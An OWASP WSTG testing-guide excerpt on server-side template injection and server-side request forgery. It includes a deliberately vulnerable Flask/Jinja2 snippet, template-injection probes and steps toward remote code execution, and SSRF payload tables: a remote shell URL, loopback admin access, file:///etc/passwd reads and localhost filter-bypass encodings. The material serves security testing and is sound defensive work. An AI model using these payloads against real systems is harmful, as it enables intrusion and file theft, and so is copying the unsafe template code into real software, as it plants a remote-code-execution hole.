# WSTG INPV — Server-Side Template Injection & SSRF

OWASP WSTG v4.2. Input Validation subset. Tests WSTG-INPV-18, 19.

## Table of Contents

- [INPV-18 Server-Side Template Injection](#wstg-inpv-18)
- [INPV-19 Server-Side Request Forgery](#wstg-inpv-19)

---

## WSTG-INPV-18

**Testing for Server-side Template Injection**

Goal: find user input embedded unsafely into a server-side template (Jinja2, Twig, FreeMarker...), leading to RCE. Common in features accepting rich user markup: wiki pages, reviews, CMS content.

Example — Flask/Jinja2, string-concatenated into the template instead of passed as a variable:
```python
@app.route("/page")
def page():
    name = request.values.get('name')
    output = Jinja2.from_string('Hello ' + name + '!').render()
    return output
```
```
$ curl -g 'http://www.target.com/page?name={{7*7}}'
Hello 49!
```
`49` in the response confirms server-side expression evaluation, not just reflected XSS.

Black-box:
1. **Detect injection** — in a plaintext context, probe with common template delimiters across engines: `{{7*7}}`, `${var}`, `<%var%>`, `[% var %]`. In a code context (input placed inside an existing template statement, e.g. `personal_greeting=username`), look for a blank/error response to a broken payload (`username<tag>` → truncated output), then try breaking out of the statement: `username}}<tag>` reflecting the tag confirms escape from the expression.
2. **Fingerprint the engine** from which expression syntax executes vs. errors (see PortSwigger's SSTI methodology), or automate with Tplmap / Backslash Powered Scanner.
3. **Build RCE** — consult the engine's docs for built-in objects/methods/filters and any documented security caveats; probe for an exposed `self`-like object and enumerate its accessible methods/attributes if docs are thin. Can lead to privilege escalation or disclosure of app secrets (API keys, config, env vars) even short of full RCE.

Tools: Tplmap, Backslash Powered Scanner (Burp extension).

Refs: James Kettle, *Server-Side Template Injection: RCE for the Modern Webapp*; PortSwigger SSTI; Extreme Vulnerable Web Application (XVWA).

---

## WSTG-INPV-19

**Testing for Server-Side Request Forgery**

Goal: find a server-side request whose target (URL, host, path) is influenced by user input, letting an attacker make the server issue requests to internal-only resources, local files, or attacker infrastructure.

SSRF is especially dangerous because backend systems reached this way often sit on non-routable IPs, have no direct user-facing auth, and carry weaker controls under the assumption of network isolation.

Black-box, given `GET https://example.com/page?page=about.php`, try:

| Payload | Target |
|---|---|
| `?page=https://malicioussite.com/shell.php` | remote-hosted malicious content |
| `?page=http://localhost/admin` or `?page=http://127.0.0.1/admin` | loopback-restricted admin page |
| `?page=file:///etc/passwd` | local file read |

These payloads apply to any HTTP method and can be injected via headers/cookies too, not just query params.

**Blind SSRF**: a POST-triggered SSRF may return nothing directly — the injected target instead gets fetched into a PDF report, invoice, or other backend artifact visible only to staff. Don't assume "no visible response" means "not vulnerable."

**PDF generators**: if the app converts uploaded HTML to PDF, try tags/CSS that trigger a fetch: `<iframe src="file:///etc/passwd">`, `<img>`, `<base>`, `<script>`, or CSS `url()` pointing at an internal service.

**Filter bypass** when `localhost`/`127.0.0.1` are blocked:

| Technique | Example |
|---|---|
| Decimal IP | `2130706433` |
| Octal IP | `017700000001` |
| Shortened IP | `127.1` |
| Attacker-owned domain resolving to `127.0.0.1` | DNS rebinding style |
| Userinfo `@` confusion | `https://expected-domain@attackerdomain` |
| URL fragment confusion | `https://attacker-domain#expected-domain` |
| URL encoding / fuzzing | combine with the above |

Remediation: SSRF is hard to fully close without an allow-list of specific permitted IPs/URLs — deny-lists on `localhost` variants are routinely bypassable.

Refs: OWASP Server Side Request Forgery Prevention Cheat Sheet; swisskyrepo SSRF Payloads; PortSwigger SSRF/Blind SSRF; *Abusing the AWS Metadata Service Using SSRF Vulnerabilities*.
